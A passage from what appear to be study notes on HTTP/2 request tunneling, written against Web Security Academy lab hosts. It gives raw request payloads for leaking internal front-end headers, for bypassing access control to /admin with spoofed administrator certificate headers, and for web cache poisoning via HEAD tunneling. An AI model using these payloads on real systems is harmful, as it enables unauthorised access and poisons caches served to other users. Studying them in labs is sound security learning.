
if the front end uses only one request/response per socket open ie. no connection reuse.

#### Leaking internal header in HTTP/2 tunneling

front end server will append its internal headers to comment part leaking the header values

```js
:method	POST
:path	/comment
:authority	vulnerable-website.com
content-type: application/x-www-form-urlencoded
foo: bar\r\n
Content-Length: 200\r\n
\r\n
comment=

x=1
```


#### Non blind tunneling using HEAD

```
:method	HEAD
:path	/example
:authority	vulnerable-website.com
thomas: t\r\n
\r\n
GET /admin HTTP/1.1
Host: 0a7e008504b85cc581777bbf00a50087.web-security-academy.net
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 5860237865014140\r\n
\r\n

```


### web cache poisoning via tunneling

if user input gets reflected in a json response normally browser won't execute those inline javascript, unless its tunneled with another HEAD request and that is cached by the cdn.

```
:method	HEAD
:path	/asset.js
:authority	vulnerable-website.com
thomas: t\r\n
\r\n
GET /my-notes?id=1 HTTP/1.1
Host: 0a7e008504b85cc581777bbf00a50087.web-security-academy.net
\r\n

```